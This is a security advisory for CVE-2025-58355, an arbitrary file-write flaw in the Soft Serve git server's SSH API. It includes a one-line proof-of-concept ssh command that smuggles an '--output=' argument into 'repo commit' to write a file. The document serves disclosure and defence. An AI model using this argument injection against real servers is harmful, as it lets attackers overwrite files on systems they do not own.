# [H] Soft Serve vulnerable to arbitrary file writing through SSH API

## Summary
Severity: High
Advisory: GHSA-33pr-m977-5w97
CVE: CVE-2025-58355
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N (CVSS_V3)
Published: 2025-09-02
Source: https://github.com/advisories/GHSA-33pr-m977-5w97
Type: github-advisory

## Affected
- Go: `github.com/charmbracelet/soft-serve` — affected >=0 <0.10.0

## Details
Attackers can create/override arbitrary files with uncontrolled data.

For a PoC, spin up an instance of soft-serve as explained in the README, and execute the following command:

```sh
ssh -p23231 localhost repo commit icecream -- --output=/tmp/pwned
```

It should have created a file in `/tmp/pwned`.

## References
- https://github.com/charmbracelet/soft-serve/security/advisories/GHSA-33pr-m977-5w97
- https://nvd.nist.gov/vuln/detail/CVE-2025-58355
- https://github.com/charmbracelet/soft-serve
